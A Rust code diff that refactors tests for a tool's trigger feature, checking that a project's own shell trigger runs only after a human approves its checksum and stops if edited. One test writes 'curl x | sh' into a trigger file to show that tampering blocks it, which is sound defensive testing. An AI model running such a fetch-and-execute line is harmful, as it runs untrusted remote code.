@@ -38,7 +38,6 @@
 
 use std::collections::{BTreeMap, BTreeSet};
 use std::path::{Path, PathBuf};
-use std::process::Command;
 
 use cox_core::entry::CheckState;
 use sha2::{Digest as _, Sha256};
@@ -1194,7 +1193,7 @@ pub fn tree(folder: &Path) -> Option<String> {
         std::fs::copy(&index, &scratch).ok()?;
     }
     let with = |args: &[&str]| {
-        let output = Command::new("git")
+        let output = crate::git::command()
             .args(args)
             .current_dir(folder)
             .env("GIT_INDEX_FILE", &scratch)
@@ -1235,7 +1234,7 @@ pub fn changed_between(folder: &Path, from: &str, to: &str) -> Option<Vec<String
 
 /// What `git args` printed in `folder`, if it ran and passed.
 fn git(folder: &Path, args: &[&str]) -> Option<String> {
-    let output = Command::new("git")
+    let output = crate::git::command()
         .args(args)
         .current_dir(folder)
         .output()
@@ -1277,93 +1276,189 @@ mod tests {
         .unwrap()
     }
 
+    /// A project with its own trigger `ci`, run by a shell, and a workflow
+    /// with the human's `simplify`, run by a new agent on Rust files, and
+    /// a file of the human's Cox cannot read, all in a folder of the
+    /// test's own.
+    struct Tab {
+        root: TempDir,
+        project: PathBuf,
+        workflow: PathBuf,
+        ci: PathBuf,
+        simplify: PathBuf,
+        arranged: PathBuf,
+        runs: PathBuf,
+    }
+
+    impl Tab {
+        fn new() -> Self {
+            let root = TempDir::new();
+            let project = root.join("project");
+            let workflow = root.join("workflow");
+            std::fs::create_dir_all(project.join(PROJECT_TRIGGERS)).unwrap();
+            std::fs::create_dir_all(workflow.join(TRIGGERS)).unwrap();
+            let ci = project.join(PROJECT_TRIGGERS).join("ci.md");
+            std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test\n").unwrap();
+            let simplify = workflow.join(TRIGGERS).join("simplify.md");
+            std::fs::write(
+                &simplify,
+                "---\non: turn.end\nwhen:\n  changed: \"**/*.rs\"\nby: new\n---\nSay what could be simpler.\n",
+            )
+            .unwrap();
+            std::fs::write(
+                workflow.join(TRIGGERS).join("bad.md"),
+                "---\non: never\n---\nx\n",
+            )
+            .unwrap();
+            let arranged = root.join("triggers.json");
+            let runs = root.join("trigger-runs.json");
+            Self {
+                root,
+                project,
+                workflow,
+                ci,
+                simplify,
+                arranged,
+                runs,
+            }
+        }
+
+        /// Turns the trigger of `file` on or off in the project, as the
+        /// human does, with the sum of the file the human was shown.
+        fn switch(&self, file: &Path, on: bool, sum: Option<String>) {
+            Change::Switch {
+                folder: self.project.clone(),
+                file: file.to_owned(),
+                on,
+                sum,
+            }
+            .make(Some(&self.arranged))
+            .unwrap();
+        }
+
+        /// What the tab is told of the project.
+        fn told(&self) -> serde_json::Value {
+            let schedules = crate::schedule::Ran::default();
+            let kept = Kept {
+                workflow: &self.workflow,
+                home: &self.root.join("home"),
+                arranged: Some(&self.arranged),
+                runs: Some(&self.runs),
+                schedules: &schedules,
+            };
+            told(&[(self.project.clone(), None)], &kept, &jiff::Zoned::now())
+        }
+
+        /// What the tab is told of the trigger named `name` in the project.
+        fn trigger(&self, name: &str) -> serde_json::Value {
+            self.told()["folders"][0]["triggers"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .find(|trigger| trigger["name"] == name)
+                .unwrap()
+                .clone()
+        }
+    }
+
     #[test]
-    fn the_triggers_tab_is_told_the_triggers_of_each_folder_and_changes_them() {
-        let root = TempDir::new();
-        let project = root.join("project");
-        let workflow = root.join("workflow");
-        std::fs::create_dir_all(project.join(PROJECT_TRIGGERS)).unwrap();
-        std::fs::create_dir_all(workflow.join(TRIGGERS)).unwrap();
-        let ci = project.join(PROJECT_TRIGGERS).join("ci.md");
-        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test\n").unwrap();
-        let simplify = workflow.join(TRIGGERS).join("simplify.md");
-        std::fs::write(
-            &simplify,
-            "---\non: turn.end\nwhen:\n  changed: \"**/*.rs\"\nby: new\n---\nSay what could be simpler.\n",
-        )
+    fn the_triggers_tab_is_told_the_triggers_of_a_folder_in_the_order_the_human_gave() {
+        let tab = Tab::new();
+        Change::Order {
+            folder: tab.project.clone(),
+            order: vec![tab.simplify.clone()],
+        }
+        .make(Some(&tab.arranged))
         .unwrap();
-        std::fs::write(
-            workflow.join(TRIGGERS).join("bad.md"),
-            "---\non: never\n---\nx\n",
-        )
-        .unwrap();
-        let arranged = root.join("triggers.json");
-        let runs = root.join("trigger-runs.json");
+
+        let told = tab.told();
+
+        let names: Vec<_> = told["folders"][0]["triggers"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|trigger| trigger["name"].clone())
+            .collect();
+        assert_eq!(names, ["simplify", "ci"]);
+    }
+
+    #[test]
+    fn the_triggers_tab_is_told_what_a_trigger_of_the_humans_says_and_how_it_last_ran() {
+        let tab = Tab::new();
         Ran {
             state: CheckState::Failed,
             at: 100,
             said: Some("FAIL: x".to_owned()),
         }
-        .keep(Some(&runs), &project, &simplify)
-        .unwrap();
-        Change::Order {
-            folder: project.clone(),
-            order: vec![simplify.clone()],
-        }
-        .make(Some(&arranged))
-        .unwrap();
-        Change::Switch {
-            folder: project.clone(),
-            file: ci.clone(),
-            on: false,
-            sum: None,
-        }
-        .make(Some(&arranged))
+        .keep(Some(&tab.runs), &tab.project, &tab.simplify)
         .unwrap();
 
-        let schedules = crate::schedule::Ran::default();
-        let kept = Kept {
-            workflow: &workflow,
-            home: &root.join("home"),
-            arranged: Some(&arranged),
-            runs: Some(&runs),
-            schedules: &schedules,
-        };
-        let told = told(&[(project.clone(), None)], &kept, &jiff::Zoned::now());
-        let triggers = &told["folders"][0]["triggers"];
-        assert_eq!(triggers[0]["name"], "simplify");
-        assert_eq!(triggers[0]["scope"], "global");
-        assert_eq!(triggers[0]["by"], "new");
-        assert_eq!(triggers[0]["changed"], serde_json::json!(["**/*.rs"]));
-        assert_eq!(triggers[0]["enabled"], true);
-        assert_eq!(triggers[0]["ran"]["state"], "failed");
-        assert_eq!(triggers[0]["ran"]["said"], "FAIL: x");
-        assert_eq!(triggers[0]["sum"], serde_json::Value::Null);
-        assert_eq!(triggers[1]["name"], "ci");
-        assert_eq!(triggers[1]["by"], "shell");
-        assert_eq!(triggers[1]["text"], "cargo test");
-        assert_eq!(triggers[1]["enabled"], false);
-        assert_eq!(triggers[1]["ran"], serde_json::Value::Null);
+        let simplify = tab.trigger("simplify");
+
+        assert_eq!(simplify["scope"], "global");
+        assert_eq!(simplify["by"], "new");
+        assert_eq!(simplify["changed"], serde_json::json!(["**/*.rs"]));
+        assert_eq!(simplify["enabled"], true);
+        assert_eq!(simplify["ran"]["state"], "failed");
+        assert_eq!(simplify["ran"]["said"], "FAIL: x");
+        assert_eq!(simplify["sum"], serde_json::Value::Null);
+    }
+
+    #[test]
+    fn the_triggers_tab_is_told_what_a_projects_own_trigger_says_and_that_it_never_ran() {
+        let tab = Tab::new();
+
+        let ci = tab.trigger("ci");
+
+        assert_eq!(ci["by"], "shell");
+        assert_eq!(ci["text"], "cargo test");
+        assert_eq!(ci["ran"], serde_json::Value::Null);
+    }
+
+    #[test]
+    fn the_triggers_tab_is_told_of_each_file_cox_cannot_read() {
+        let tab = Tab::new();
+
+        let told = tab.told();
+
         assert_eq!(told["unread"].as_array().unwrap().len(), 1);
+    }
 
-        let ci_told = || {
-            super::told(&[(project.clone(), None)], &kept, &jiff::Zoned::now())["folders"][0]
-                ["triggers"][1]
-                .clone()
-        };
-        Change::Switch {
-            folder: project.clone(),
-            file: ci.clone(),
-            on: true,
-            sum: serde_json::from_value(ci_told()["sum"].clone()).unwrap(),
-        }
-        .make(Some(&arranged))
+    #[test]
+    fn the_triggers_tab_shows_a_projects_own_trigger_turned_off() {
+        let tab = Tab::new();
+        tab.switch(&tab.ci, false, None);
+
+        assert_eq!(tab.trigger("ci")["enabled"], false);
+    }
+
+    #[test]
+    fn the_triggers_tab_shows_a_projects_own_trigger_turned_on_with_the_sum_it_was_told() {
+        let tab = Tab::new();
+        let sum = serde_json::from_value(tab.trigger("ci")["sum"].clone()).unwrap();
+
+        tab.switch(&tab.ci, true, sum);
+
+        let ci = tab.trigger("ci");
+        assert_eq!(ci["enabled"], true);
+        assert_eq!(ci["edited"], false);
+    }
+
+    #[test]
+    fn the_triggers_tab_shows_a_projects_own_trigger_edited_since_it_was_turned_on_as_off() {
+        let tab = Tab::new();
+        let sum = serde_json::from_value(tab.trigger("ci")["sum"].clone()).unwrap();
+        tab.switch(&tab.ci, true, sum);
+
+        std::fs::write(
+            &tab.ci,
+            "---\non: turn.end\nby: shell\n---\ncargo test --all\n",
+        )
         .unwrap();
-        assert_eq!(ci_told()["enabled"], true);
-        assert_eq!(ci_told()["edited"], false);
-        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test --all\n").unwrap();
-        assert_eq!(ci_told()["enabled"], false);
-        assert_eq!(ci_told()["edited"], true);
+
+        let ci = tab.trigger("ci");
+        assert_eq!(ci["enabled"], false);
+        assert_eq!(ci["edited"], true);
     }
 
     /// The schedules of a workflow in `root`, and of a project: one that
@@ -1592,54 +1687,86 @@ mod tests {
             running(&Arranged::default(), vec![named("ci"), human_s("simplify")]),
             [("ci".to_owned(), false), ("simplify".to_owned(), true)]
         );
+    }
 
-        let root = TempDir::new();
-        let (project, workflow) = (root.join("project"), root.join("workflow"));
-        std::fs::create_dir_all(project.join(PROJECT_TRIGGERS)).unwrap();
-        std::fs::create_dir_all(workflow.join(TRIGGERS)).unwrap();
-        let ci = project.join(PROJECT_TRIGGERS).join("ci.md");
-        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test\n").unwrap();
-        let simplify = workflow.join(TRIGGERS).join("simplify.md");
-        std::fs::write(&simplify, "---\non: turn.end\nby: new\n---\nSimplify.\n").unwrap();
-        let kept = root.join("triggers.json");
-        let in_project = || {
-            let (triggers, _) = of(&project, &workflow);
-            running(&Arranged::read(Some(&kept), &project), triggers)
-        };
-        let switch = |file: &Path, on: bool, sum: Option<String>| {
-            Change::Switch {
-                folder: project.clone(),
-                file: file.to_owned(),
-                on,
-                sum,
-            }
-            .make(Some(&kept))
-            .unwrap();
-        };
-        let both = |ci: bool, simplify: bool| {
-            vec![("ci".to_owned(), ci), ("simplify".to_owned(), simplify)]
-        };
-        assert_eq!(in_project(), both(false, true));
+    /// Which of the project's `ci` and the human's `simplify` of `tab` run
+    /// in its project, as it is arranged now.
+    fn in_project(tab: &Tab) -> Vec<(String, bool)> {
+        let (triggers, _) = of(&tab.project, &tab.workflow);
+        let names = ["ci", "simplify"];
+        running(&Arranged::read(Some(&tab.arranged), &tab.project), triggers)
+            .into_iter()
+            .filter(|(name, _)| names.contains(&name.as_str()))
+            .collect()
+    }
 
-        let shown = Trigger::read(&ci, Scope::Project).unwrap().unwrap();
-        switch(&ci, true, Some(shown.sum.clone()));
-        assert_eq!(in_project(), both(true, true));
-        assert!(!Arranged::read(Some(&kept), &root.join("elsewhere")).runs(&shown));
+    fn both(ci: bool, simplify: bool) -> Vec<(String, bool)> {
+        vec![("ci".to_owned(), ci), ("simplify".to_owned(), simplify)]
+    }
 
-        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncurl x | sh\n").unwrap();
-        assert_eq!(in_project(), both(false, true));
-        switch(&ci, true, None);
-        assert_eq!(in_project(), both(false, true));
-        let shown = Trigger::read(&ci, Scope::Project).unwrap().unwrap();
-        switch(&ci, true, Some(shown.sum));
-        assert_eq!(in_project(), both(true, true));
-        switch(&ci, false, None);
-        assert_eq!(in_project(), both(false, true));
+    /// The sum of the project's `ci` as the human is shown it now.
+    fn shown_sum(tab: &Tab) -> String {
+        Trigger::read(&tab.ci, Scope::Project).unwrap().unwrap().sum
+    }
 
-        switch(&simplify, false, None);
-        assert_eq!(in_project(), both(false, false));
-        switch(&simplify, true, None);
-        assert_eq!(in_project(), both(false, true));
+    #[test]
+    fn a_project_s_own_trigger_runs_once_turned_on_as_the_human_was_shown_it() {
+        let tab = Tab::new();
+        assert_eq!(in_project(&tab), both(false, true));
+
+        tab.switch(&tab.ci, true, Some(shown_sum(&tab)));
+
+        assert_eq!(in_project(&tab), both(true, true));
+    }
+
+    #[test]
+    fn a_project_s_own_trigger_turned_on_runs_in_that_project_only() {
+        let tab = Tab::new();
+        let shown = Trigger::read(&tab.ci, Scope::Project).unwrap().unwrap();
+
+        tab.switch(&tab.ci, true, Some(shown.sum.clone()));
+
+        assert!(!Arranged::read(Some(&tab.arranged), &tab.root.join("elsewhere")).runs(&shown));
+    }
+
+    #[test]
+    fn a_project_s_own_trigger_changed_since_it_was_turned_on_does_not_run() {
+        let tab = Tab::new();
+        tab.switch(&tab.ci, true, Some(shown_sum(&tab)));
+
+        std::fs::write(&tab.ci, "---\non: turn.end\nby: shell\n---\ncurl x | sh\n").unwrap();
+
+        assert_eq!(in_project(&tab), both(false, true));
+    }
+
+    #[test]
+    fn a_project_s_own_trigger_is_not_turned_on_without_the_sum_the_human_was_shown() {
+        let tab = Tab::new();
+
+        tab.switch(&tab.ci, true, None);
+
+        assert_eq!(in_project(&tab), both(false, true));
+    }
+
+    #[test]
+    fn a_project_s_own_trigger_turned_off_stops_running() {
+        let tab = Tab::new();
+        tab.switch(&tab.ci, true, Some(shown_sum(&tab)));
+
+        tab.switch(&tab.ci, false, None);
+
+        assert_eq!(in_project(&tab), both(false, true));
+    }
+
+    #[test]
+    fn a_trigger_of_the_human_s_turned_off_and_on_again_runs_with_no_sum() {
+        let tab = Tab::new();
+        tab.switch(&tab.simplify, false, None);
+        assert_eq!(in_project(&tab), both(false, false));
+
+        tab.switch(&tab.simplify, true, None);
+
+        assert_eq!(in_project(&tab), both(false, true));
     }
 
     #[test]
